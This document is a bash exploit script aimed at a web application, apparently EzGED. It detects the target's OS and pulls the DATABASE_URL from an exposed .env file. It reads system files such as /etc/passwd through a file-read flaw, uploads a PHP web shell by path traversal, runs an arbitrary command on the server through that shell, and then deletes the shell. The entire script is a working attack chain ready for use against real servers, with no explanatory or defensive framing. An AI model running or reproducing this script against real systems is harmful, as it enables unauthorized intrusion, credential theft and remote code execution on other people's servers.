head=$(curl -ski $1 | grep Server)

win=$(echo $head | grep Win)


lin=$(echo $head | grep Debian)


if [ ! -z "$win" ]
then
echo "It's a Windows.."

echo "=========================="
echo "Check for env leak"
curl -sk "$1/sf/app/.env" | grep DATABASE_URL
echo "=========================="
echo ""
echo ""
echo "=========================="
echo "Check for file read"
curl -sk "$1/data/showparaphdocs.php?path=C:\Windows\System32\drivers\etc\hosts" | head -10
echo "=========================="
echo ""
echo ""
echo "=========================="
echo "Let's execute some command shall we.."
curl -sk -F "name=..\..\..\..\..\..\nchp\usr\local\nchp\ezged\www\data\test.php" -F "file=@./test.php" "$1/data/pupload.php?mode=cold&waitdir=.." > /dev/null
echo "Executing : $2"
curl -sk -X POST "$1/data/test.php" -d "test=$2"
echo ""
echo "Cleaning"
curl -sk "$1/data/test.php?test=del%20test.php" > /dev/null
echo "=========================="

else if [ ! -z "$lin" ]
then
echo "It's a Linux.."
echo "=========================="
echo "Check for env leak"
curl -sk "$1/sf/app/.env" | grep DATABASE_URL
echo "=========================="
echo ""
echo ""
echo "=========================="
echo "Check for file read"
curl -sk "$1/data/showparaphdocs.php?path=/etc/passwd" | head -10
echo "=========================="
echo ""
echo ""
echo "Let's execute some command shall we.."
curl -sk -F "name=../../../../../../../../../../../../../../../proc/self/cwd/test.php" -F "file=@./test.php" "$1/data/pupload.php?mode=cold&waitdir=../../../../../../../../tmp"  > /dev/null
echo "Executing : $2"
curl -sk -X POST "$1/data/test.php" -d "test=$2"
echo ""
echo "Cleaning"
curl -sk "$1/data/test.php?test=rm%20test.php"   > /dev/null
echo "=========================="
fi
fi
